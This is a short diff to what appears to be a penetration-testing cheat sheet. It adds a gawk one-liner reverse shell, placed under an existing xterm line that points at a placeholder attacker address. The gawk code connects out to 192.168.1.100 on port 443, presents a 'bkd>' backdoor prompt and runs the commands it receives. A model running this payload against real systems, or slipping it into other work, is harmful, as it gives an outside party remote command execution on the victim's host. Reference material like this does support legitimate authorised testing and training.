@@ -128,6 +128,11 @@ On target:
 xterm -display ATTACKER.IP.HERE:1
 ```
 
+- gawk
+```
+gawk 'BEGIN {P=443;S="bkd> ";H="192.168.1.100";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
+```
+
 # grep
 - Multiple search terms:
 ```
